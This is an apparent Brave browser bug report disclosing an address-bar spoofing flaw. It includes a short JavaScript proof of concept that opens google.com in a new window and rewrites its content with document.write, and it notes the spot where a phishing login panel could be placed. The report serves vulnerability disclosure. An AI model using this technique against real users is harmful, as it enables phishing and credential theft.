Did you search for similar issues before submitting this one?
Yes
Describe the issue you encountered:
It's possible to spoof the URL that is shown in the address bar by opening a new window and writing to it using document.write.
Expected behavior:
The browser to show the real location instead of the spoofed one.
Platform (Win7, 8, 10? macOS? Linux distro?):
Ubuntu 16.04 LTS
Brave Version:

Brave: 0.11.1
Electron: 1.2.7
libchromiumcontent: 51.0.2704.103
V8: 5.1.281.65
Node.js: 6.1.0
Update Channel: dev

Steps to reproduce:
1. Place this code into an .html file in your server:
<script>
    function spoof() {
        nWindow = window.open('https:/www.google.com');
        nWindow.document.write('<body><pre>Here we could place a phising login panel</pre></body>');
}
</script>
<input type="button" onclick="spoof()" value="PoC!">
The page is being hosted in my server

Open it using Brave Browser.
Click the button, then the URL will be `https://www.google.com/` but the real location will be your server.
